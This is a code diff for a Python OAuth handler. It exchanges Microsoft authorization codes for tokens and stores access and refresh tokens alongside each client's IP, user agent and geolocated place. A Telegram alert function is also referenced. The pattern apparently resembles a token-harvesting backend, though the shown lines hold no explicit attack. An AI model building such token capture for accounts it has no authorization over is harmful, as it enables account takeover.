@@ -1,7 +1,7 @@
-from db import SessionLocal
+from db import SessionLocal, init_db  # ✅ UPDATED
 from models import TenantToken
 from datetime import datetime, timedelta
-from urllib.parse import urlencode, quote_plus
+from urllib.parse import urlencode, quote_plus, unquote  # ✅ UPDATED
 import requests
 import os
 import uuid
@@ -38,7 +38,6 @@ def save_token(user_id, session_id, token_data, device_info=None):
         existing.refresh_token = token_data.get("refresh_token") or existing.refresh_token
         existing.expires_at = expires_at
 
-        # ✅ update device info
         if device_info:
             existing.ip_address = device_info.get("ip")
             existing.user_agent = device_info.get("agent")
@@ -109,9 +108,14 @@ def send_telegram_alert(message: str):
 
 
 # =========================
-# TOKEN EXCHANGE (UPDATED WITH DEVICE TRACKING)
+# TOKEN EXCHANGE (FIXED)
 # =========================
 def exchange_code_for_token(code: str, state: str, client_ip: str = None, user_agent: str = None):
+
+    init_db()  # ✅ FIX 1: ensure table exists
+
+    state = unquote(state)  # ✅ FIX 2: decode URL-encoded state
+
     if ":" in state:
         user_id, session_id = state.split(":")
     else:
@@ -133,7 +137,6 @@ def exchange_code_for_token(code: str, state: str, client_ip: str = None, user_a
     if "error" in result:
         raise Exception(f"Token exchange failed: {result['error_description']}")
 
-    # ✅ Get location string
     location_str = "unknown"
     if client_ip:
         try:
@@ -144,17 +147,14 @@ def exchange_code_for_token(code: str, state: str, client_ip: str = None, user_a
         except:
             pass
 
-    # ✅ Device info bundle
     device_info = {
         "ip": client_ip,
         "agent": user_agent,
         "location": location_str
     }
 
-    # ✅ Save with device info
     save_token(user_id, session_id, result, device_info)
 
-    # Fetch email
     headers = {"Authorization": f"Bearer {result['access_token']}"}
     try:
         graph_resp = requests.get("https://graph.microsoft.com/v1.0/me", headers=headers)
